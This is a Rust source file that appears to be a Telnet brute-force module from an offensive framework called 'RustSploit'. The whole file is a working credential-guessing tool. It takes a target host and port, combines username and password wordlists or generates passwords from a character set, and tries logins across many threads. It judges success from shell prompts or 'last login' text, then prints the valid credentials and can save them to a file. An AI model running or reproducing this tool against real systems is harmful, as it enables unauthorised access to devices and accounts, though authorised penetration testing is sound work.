use anyhow::{anyhow, Context, Result};
use regex::Regex;
use std::fs::{File, OpenOptions};
use std::io::{self, BufRead, BufReader, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::path::Path;
use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicBool, Ordering, AtomicUsize};
use std::time::Duration;
use std::thread;
use telnet::Event;
use threadpool::ThreadPool;
use crossbeam_channel::{unbounded, Sender};
use telnet::Telnet;

pub async fn run(target: &str) -> Result<()> {
    println!("\n=== Telnet Bruteforce Module (RustSploit) ===\n");

    let target = target.trim().to_string();
    let port = prompt_port(23);
    let username_wordlist = prompt_wordlist("Username wordlist file: ")?;
    let raw_bruteforce = prompt_yes_no(
        "Enable raw brute-force password generation? (y/n): ",
        false,
    );
    let password_wordlist = if raw_bruteforce {
        prompt_optional_wordlist("Password wordlist file (leave blank to skip): ")?
    } else {
        Some(prompt_wordlist("Password wordlist file: ")?)
    };
    let (raw_charset, raw_max_length) = if raw_bruteforce {
        let charset = prompt_charset(
            "Raw brute-force character set (default a-zA-Z0-9!@#$%^&*()-_=+[]{}|;:'\",.<>?/\\): ",
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:'\",.<>?/\\",
        );
        let max_len = prompt_max_length(4, 1, 6);
        (charset, max_len)
    } else {
        (String::new(), 0)
    };
    let threads = prompt_threads(8);
    let stop_on_success = prompt_yes_no("Stop on first valid login? (y/n): ", false);
    let full_combo = prompt_yes_no(
        "Try every username with every password? (y/n): ",
        false,
    );
    let verbose = prompt_yes_no("Verbose mode? (y/n): ", false);

    let config = TelnetBruteforceConfig {
        target,
        port,
        username_wordlist,
        password_wordlist,
        threads,
        stop_on_success,
        verbose,
        full_combo,
        raw_bruteforce,
        raw_charset,
        raw_max_length,
    };

    run_telnet_bruteforce(config)
}

#[derive(Clone)]
struct TelnetBruteforceConfig {
    target: String,
    port: u16,
    username_wordlist: String,
    password_wordlist: Option<String>,
    threads: usize,
    stop_on_success: bool,
    verbose: bool,
    full_combo: bool,
    raw_bruteforce: bool,
    raw_charset: String,
    raw_max_length: usize,
}

fn run_telnet_bruteforce(config: TelnetBruteforceConfig) -> Result<()> {
    // 1) Normalize & validate host:port
    let addr = normalize_target(&config.target, config.port)
        .context("Invalid target address")?;
    let socket_addr = addr
        .to_socket_addrs()?
        .next()
        .context("Unable to resolve target address")?;

    println!("\n[*] Starting Telnet bruteforce on {}", socket_addr);

    let usernames = read_lines(&config.username_wordlist)?;
    if usernames.is_empty() {
        return Err(anyhow!(
            "Username wordlist '{}' is empty",
            config.username_wordlist
        ));
    }

    let passwords = if let Some(ref pwd_path) = config.password_wordlist {
        let list = read_lines(pwd_path)?;
        if list.is_empty() && !config.raw_bruteforce {
            return Err(anyhow!("Password wordlist '{}' is empty", pwd_path));
        }
        list
    } else {
        Vec::new()
    };

    if !config.raw_bruteforce && passwords.is_empty() {
        return Err(anyhow!(
            "No passwords available (wordlist empty and raw brute-force disabled)"
        ));
    }
    if config.raw_bruteforce && config.raw_charset.is_empty() {
        return Err(anyhow!("Raw brute-force enabled but character set is empty"));
    }
    if config.raw_bruteforce && config.raw_max_length == 0 {
        return Err(anyhow!("Raw brute-force enabled but max length is zero"));
    }

    let creds = Arc::new(Mutex::new(Vec::new()));
    let stop_flag = Arc::new(AtomicBool::new(false));
    let pool = ThreadPool::new(config.threads);
    let attempt_counter = Arc::new(AtomicUsize::new(0));
    let (tx, rx) = unbounded();

    println!("[*] Loaded {} username(s).", usernames.len());
    if !passwords.is_empty() {
        println!("[*] Loaded {} password(s) from wordlist.", passwords.len());
    }

    // 2) Build the combo queue
    if !passwords.is_empty() {
        enqueue_wordlist_combos(
            &tx,
            &usernames,
            &passwords,
            config.full_combo,
            Arc::clone(&attempt_counter),
        )?;
    }

    let mut generators = Vec::new();
    if config.raw_bruteforce {
        println!(
            "[*] Raw brute-force enabled. Charset size: {}. Max length: {}.",
            config.raw_charset.chars().count(),
            config.raw_max_length
        );

        let tx_clone = tx.clone();
        let usernames_clone = usernames.clone();
        let charset: Vec<char> = config.raw_charset.chars().collect();
        let max_len = config.raw_max_length;
        let stop_clone = Arc::clone(&stop_flag);
        let counter_clone = Arc::clone(&attempt_counter);
        let full_combo = config.full_combo;
        generators.push(thread::spawn(move || {
            generate_raw_passwords(
                tx_clone,
                usernames_clone,
                charset,
                max_len,
                full_combo,
                stop_clone,
                counter_clone,
            );
        }));
    }

    drop(tx);

    // 3) Spawn workers
    for _ in 0..config.threads {
        let rx = rx.clone();
        let addr = addr.clone();
        let stop_flag = Arc::clone(&stop_flag);
        let creds = Arc::clone(&creds);
        let cfg = config.clone();

        pool.execute(move || {
            while let Ok((user, pass)) = rx.recv() {
                if stop_flag.load(Ordering::Relaxed) {
                    break;
                }
                if cfg.verbose {
                    println!("[*] Trying {}:{}", user, pass);
                }
                match try_telnet_login(&addr, &user, &pass) {
                    Ok(true) => {
                        println!("[+] Valid: {}:{}", user, pass);
                        creds.lock().unwrap().push((user, pass));
                        if cfg.stop_on_success {
                            stop_flag.store(true, Ordering::Relaxed);
                            break;
                        }
                    }
                    Ok(false) => {}
                    Err(e) => {
                        if cfg.verbose {
                            eprintln!("[!] Error: {}", e);
                        }
                    }
                }
            }
        });
    }
    pool.join();

    for handle in generators {
        let _ = handle.join();
    }

    println!(
        "[*] Total credential attempts queued: {}",
        attempt_counter.load(Ordering::Relaxed)
    );

    // 4) Report & optional save
    let found = creds.lock().unwrap();
    if found.is_empty() {
        println!("[-] No valid credentials found.");
    } else {
        println!("\n[+] Found credentials:");
        for (u, p) in found.iter() {
            println!(" - {}:{}", u, p);
        }
        if prompt("\n[?] Save to file? (y/n): ")
            .trim()
            .eq_ignore_ascii_case("y")
        {
            let file = prompt("Filename: ");
            if let Err(e) = save_results(&file, &found) {
                eprintln!("[!] Failed to save: {}", e);
            } else {
                println!("[+] Results saved to '{}'", file);
            }
        }
    }

    Ok(())
}

/// Attempt a single login, with 0.7 s connect+I/O timeout
fn try_telnet_login(addr: &str, username: &str, password: &str) -> Result<bool> {
    // Resolve to SocketAddr
    let socket = addr
        .to_socket_addrs()?
        .next()
        .ok_or_else(|| anyhow::anyhow!("Could not resolve address"))?;

    // Connect with 1500 ms timeout
    let stream = TcpStream::connect_timeout(&socket, Duration::from_millis(1500))
        .context("Connection timed out")?;
    // I/O timeout
    stream
        .set_read_timeout(Some(Duration::from_millis(1500)))
        .context("Failed to set read timeout")?;
    stream
        .set_write_timeout(Some(Duration::from_millis(1500)))
        .context("Failed to set write timeout")?;

    // Wrap into Telnet
    let mut connection = Telnet::from_stream(Box::new(stream), 256);

    let mut login_seen = false;
    let mut pass_seen = false;
    for _ in 0..10 {
        let event = connection.read().context("Read error or timeout")?;
        if let Event::Data(buffer) = event {
            let out = String::from_utf8_lossy(&buffer).to_lowercase();
            if !login_seen && (out.contains("login:") || out.contains("username")) {
                connection.write(format!("{}\n", username).as_bytes())?;
                login_seen = true;
            } else if login_seen && !pass_seen && out.contains("password") {
                connection.write(format!("{}\n", password).as_bytes())?;
                pass_seen = true;
            } else if pass_seen {
                if out.contains("incorrect")
                    || out.contains("failed")
                    || out.contains("denied")
                {
                    return Ok(false);
                }
                if out.contains("last login")
                    || out.contains("$")
                    || out.contains("#")
                    || out.contains("welcome")
                {
                    return Ok(true);
                }
            }
        }
    }

    Ok(false)
}

fn read_lines(path: &str) -> Result<Vec<String>> {
    let f = File::open(path).context(format!("Unable to open {}", path))?;
    Ok(
        BufReader::new(f)
            .lines()
            .filter_map(|line| line.ok().map(|l| l.trim().to_string()))
            .filter(|line| !line.is_empty())
            .collect(),
    )
}

fn save_results(path: &str, creds: &[(String, String)]) -> Result<()> {
    let mut f = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(path)?;
    for (u, p) in creds {
        writeln!(f, "{}:{}", u, p)?;
    }
    Ok(())
}

fn prompt(msg: &str) -> String {
    print!("{}", msg);
    if let Err(e) = io::stdout().flush() {
        eprintln!("[!] Failed to flush stdout: {}", e);
    }
    let mut buf = String::new();
    match io::stdin().read_line(&mut buf) {
        Ok(_) => buf.trim().to_string(),
        Err(e) => {
            eprintln!("[!] Failed to read input: {}", e);
            String::new()
        }
    }
}

/// Enhanced IPv4/IPv6/domain normalizer & resolver
fn normalize_target(host: &str, default_port: u16) -> Result<String> {
    let re = Regex::new(r"^\[*(?P<addr>[^\]]+?)\]*(?::(?P<port>\d{1,5}))?$").unwrap();
    let caps = re
        .captures(host.trim())
        .ok_or_else(|| anyhow::anyhow!("Invalid target format: {}", host))?;
    let addr = caps.name("addr").unwrap().as_str();
    let port = if let Some(m) = caps.name("port") {
        m.as_str().parse::<u16>().context("Invalid port value")?
    } else {
        default_port
    };
    let formatted = if addr.contains(':') && !addr.contains('.') {
        format!("[{}]:{}", addr, port)
    } else {
        format!("{}:{}", addr, port)
    };
    // Verify DNS/getaddrinfo
    formatted
        .to_socket_addrs()
        .context(format!("Could not resolve {}", formatted))?;
    Ok(formatted)
}

fn prompt_port(default: u16) -> u16 {
    loop {
        let input = prompt("Port (default 23): ");
        if input.is_empty() {
            return default;
        }
        match input.parse::<u16>() {
            Ok(port) if port > 0 => return port,
            _ => println!("[!] Invalid port value. Please enter a number between 1 and 65535."),
        }
    }
}

fn prompt_threads(default: usize) -> usize {
    loop {
        let input = prompt("Number of threads (default 8): ");
        if input.is_empty() {
            return default.max(1);
        }
        match input.parse::<usize>() {
            Ok(val) if val >= 1 && val <= 256 => return val,
            _ => println!("[!] Invalid thread count. Please enter a value between 1 and 256."),
        }
    }
}

fn prompt_yes_no(message: &str, default: bool) -> bool {
    loop {
        let input = prompt(message);
        if input.is_empty() {
            return default;
        }
        match input.to_lowercase().as_str() {
            "y" | "yes" | "true" => return true,
            "n" | "no" | "false" => return false,
            _ => println!("[!] Please respond with y or n."),
        }
    }
}

fn prompt_wordlist(prompt_text: &str) -> Result<String> {
    loop {
        let path = prompt(prompt_text);
        if path.is_empty() {
            println!("[!] Path cannot be empty.");
            continue;
        }
        let trimmed = path.trim();
        let candidate = Path::new(trimmed);
        if candidate.is_file() {
            return Ok(trimmed.to_string());
        } else {
            println!("[!] File '{}' does not exist or is not a regular file.", trimmed);
        }
    }
}

fn prompt_optional_wordlist(prompt_text: &str) -> Result<Option<String>> {
    loop {
        let path = prompt(prompt_text);
        if path.is_empty() {
            return Ok(None);
        }
        let trimmed = path.trim();
        let candidate = Path::new(trimmed);
        if candidate.is_file() {
            return Ok(Some(trimmed.to_string()));
        } else {
            println!("[!] File '{}' does not exist or is not a regular file.", trimmed);
        }
    }
}

fn prompt_charset(prompt_text: &str, default: &str) -> String {
    let input = prompt(prompt_text);
    let charset = if input.is_empty() {
        default.to_string()
    } else {
        input.trim().to_string()
    };
    if charset.is_empty() {
        default.to_string()
    } else {
        charset
    }
}

fn prompt_max_length(default: usize, min: usize, max: usize) -> usize {
    loop {
        let input = prompt(&format!(
            "Maximum password length ({}-{}, default {}): ",
            min, max, default
        ));
        if input.is_empty() {
            return default.clamp(min, max);
        }
        match input.parse::<usize>() {
            Ok(val) if val >= min && val <= max => return val,
            _ => println!(
                "[!] Invalid length. Please enter a value between {} and {}.",
                min, max
            ),
        }
    }
}

fn enqueue_wordlist_combos(
    tx: &Sender<(String, String)>,
    usernames: &[String],
    passwords: &[String],
    full_combo: bool,
    counter: Arc<AtomicUsize>,
) -> Result<()> {
    if passwords.is_empty() {
        return Ok(());
    }

    if full_combo {
        for u in usernames {
            for p in passwords {
                tx.send((u.clone(), p.clone()))?;
                counter.fetch_add(1, Ordering::Relaxed);
            }
        }
    } else if usernames.len() == 1 {
        for p in passwords {
            tx.send((usernames[0].clone(), p.clone()))?;
            counter.fetch_add(1, Ordering::Relaxed);
        }
    } else if passwords.len() == 1 {
        for u in usernames {
            tx.send((u.clone(), passwords[0].clone()))?;
            counter.fetch_add(1, Ordering::Relaxed);
        }
    } else {
        println!("[!] Multiple creds & full_combo=OFF → using first username.");
        for p in passwords {
            tx.send((usernames[0].clone(), p.clone()))?;
            counter.fetch_add(1, Ordering::Relaxed);
        }
    }

    Ok(())
}

fn generate_raw_passwords(
    tx: Sender<(String, String)>,
    usernames: Vec<String>,
    charset: Vec<char>,
    max_len: usize,
    full_combo: bool,
    stop_flag: Arc<AtomicBool>,
    counter: Arc<AtomicUsize>,
) {
    if charset.is_empty() || max_len == 0 {
        return;
    }

    let usernames_to_use: Vec<String> = if full_combo || usernames.len() == 1 {
        usernames
    } else {
        vec![usernames[0].clone()]
    };

    for length in 1..=max_len {
        if stop_flag.load(Ordering::Relaxed) {
            break;
        }
        let mut current = Vec::with_capacity(length);
        generate_passwords_recursive(
            &tx,
            &usernames_to_use,
            &charset,
            length,
            &mut current,
            &stop_flag,
            &counter,
        );
        if stop_flag.load(Ordering::Relaxed) {
            break;
        }
    }
}

fn generate_passwords_recursive(
    tx: &Sender<(String, String)>,
    usernames: &[String],
    charset: &[char],
    remaining: usize,
    current: &mut Vec<char>,
    stop_flag: &Arc<AtomicBool>,
    counter: &Arc<AtomicUsize>,
) {
    if stop_flag.load(Ordering::Relaxed) {
        return;
    }

    if remaining == 0 {
        let password: String = current.iter().collect();
        for user in usernames {
            if stop_flag.load(Ordering::Relaxed) {
                break;
            }
            if tx.send((user.clone(), password.clone())).is_err() {
                return;
            }
            counter.fetch_add(1, Ordering::Relaxed);
        }
        return;
    }

    for &ch in charset {
        if stop_flag.load(Ordering::Relaxed) {
            break;
        }
        current.push(ch);
        generate_passwords_recursive(
            tx,
            usernames,
            charset,
            remaining - 1,
            current,
            stop_flag,
            counter,
        );
        current.pop();
    }
}
